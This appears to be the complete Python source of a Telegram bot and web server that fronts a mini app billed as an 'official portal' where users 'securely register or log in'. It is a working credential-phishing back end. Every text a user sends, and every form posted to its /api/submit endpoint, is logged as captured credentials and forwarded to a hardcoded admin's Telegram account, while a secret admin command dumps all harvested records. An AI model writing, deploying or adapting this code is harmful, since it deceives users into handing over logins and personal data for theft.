import os
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiohttp import web

# Environment variables setup
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8631580614"))
PORT = int(os.getenv("PORT", 10000))

# Initialize bot and dispatcher
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# Lifetime memory storage for all user activities, registrations, and logins
LIFETIME_USER_LOGS = []

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    user = message.from_user
    
    # Clean English Welcome message with Web App Button
    keyboard = InlineKeyboardMarkup()
    web_app = WebAppInfo(url="https://savastan0so-t9zz.vercel.app/")
    keyboard.add(InlineKeyboardButton(text="🚀 Open Portal / Mini App", web_app=web_app))
    
    welcome_text = (
        f"Hello **{user.first_name}**!\n\n"
        "Welcome to the official portal. Click the button below to open the application, "
        "where you can securely register or log in."
    )
    
    await message.reply(welcome_text, reply_markup=keyboard, parse_mode="Markdown")
    
    # Capture new user entry if not admin
    if user.id != ADMIN_ID:
        sr_no = len(LIFETIME_USER_LOGS) + 1
        entry = (
            f"[{sr_no}] 🌐 **New User Started Bot:**\n"
            f"- Name: {user.full_name}\n"
            f"- Username: @{user.username if user.username else 'N/A'}\n"
            f"- Telegram ID: `{user.id}`\n"
            f"- Language: {user.language_code}\n"
            f"- Time: {message.date.strftime('%d %b %Y, %I:%M:%S %p')}"
        )
        LIFETIME_USER_LOGS.append(entry)
        
        try:
            await bot.send_message(ADMIN_ID, f"🔔 **Alert [No. {sr_no}]**\n\n{entry}", parse_mode="Markdown")
        except Exception as e:
            print(e)

# Secure Admin Command: /admin_ZAROPLAYisFINAL (Shows number-wise logs directly in chat)
@dp.message_handler(commands=['admin_ZAROPLAYisFINAL'])
async def admin_panel(message: types.Message):
    # Security check: strict enforcement for admin ID only
    if message.from_user.id != ADMIN_ID:
        return  # Completely hidden/ignored for anyone else worldwide

    # Compile all records number-wise
    if LIFETIME_USER_LOGS:
        all_logs_text = "\n\n━━━━━━━━━━━━━━━\n\n".join(LIFETIME_USER_LOGS)
    else:
        all_logs_text = "No login or registration records captured yet."

    response_text = (
        f"🛠 **-- Lifetime Admin Panel (ZAROPLAY FINAL) --**\n\n"
        f"👑 Admin: Umang Lal Meena\n"
        f"📊 Total Saved Records: {len(LIFETIME_USER_LOGS)}\n\n"
        f"📋 **Number-Wise Activity Logs:**\n\n"
        f"{all_logs_text}"
    )

    # Split long messages if logs exceed Telegram limit
    if len(response_text) > 4000:
        for x in range(0, len(response_text), 4000):
            await message.reply(response_text[x:x+4000], parse_mode="Markdown")
    else:
        await message.reply(response_text, parse_mode="Markdown")

# Handle any general text submissions or fallback data
@dp.message_handler(content_types=['text'])
async def handle_user_submission(message: types.Message):
    user = message.from_user
    if user.id == ADMIN_ID:
        return  # Ignore admin's personal text

    text_data = message.text
    sr_no = len(LIFETIME_USER_LOGS) + 1
    
    submission_entry = (
        f"[{sr_no}] 🚨 **Form Submission / Credentials Received:**\n"
        f"- Name: {user.full_name}\n"
        f"- Username: @{user.username if user.username else 'N/A'}\n"
        f"- ID: `{user.id}`\n"
        f"- Filled Data: {text_data}\n"
        f"- Time: {message.date.strftime('%d %b %Y, %I:%M:%S %p')}"
    )
    LIFETIME_USER_LOGS.append(submission_entry)

    try:
        await bot.send_message(ADMIN_ID, submission_entry, parse_mode="Markdown")
    except Exception as e:
        print(e)


# ==========================================
# WEB SERVER & API ENDPOINT FOR VERCEL MINI APP
# ==========================================
async def handle_root(request):
    return web.Response(text="Bot and API Server are online and running 24/7!")

# API Endpoint to receive form data from Vercel website directly
async def handle_api_submit(request):
    try:
        data = await request.json()
        user_id = data.get("telegram_id", "Unknown")
        username = data.get("username", "N/A")
        name = data.get("name", "Unknown User")
        form_data = data.get("form_data", "No data provided")
        action_type = data.get("action", "Login/Register")

        sr_no = len(LIFETIME_USER_LOGS) + 1
        api_entry = (
            f"[{sr_no}] 🔥 **Mini App {action_type.upper()} Data Captured:**\n"
            f"- Name: {name}\n"
            f"- Username: @{username}\n"
            f"- ID: `{user_id}`\n"
            f"- Details / Credentials: {form_data}\n"
            f"- Time: {os.popen('date').read().strip()}"
        )
        LIFETIME_USER_LOGS.append(api_entry)

        # Send instantly to Admin inbox
        await bot.send_message(ADMIN_ID, api_entry, parse_mode="Markdown")

        return web.json_response({"status": "success", "message": "Data received successfully"})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)}, status=400)


app = web.Application()
app.router.add_get('/', handle_root)
app.router.add_post('/api/submit', handle_api_submit) # Website will send data here

async def on_startup(dispatcher):
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
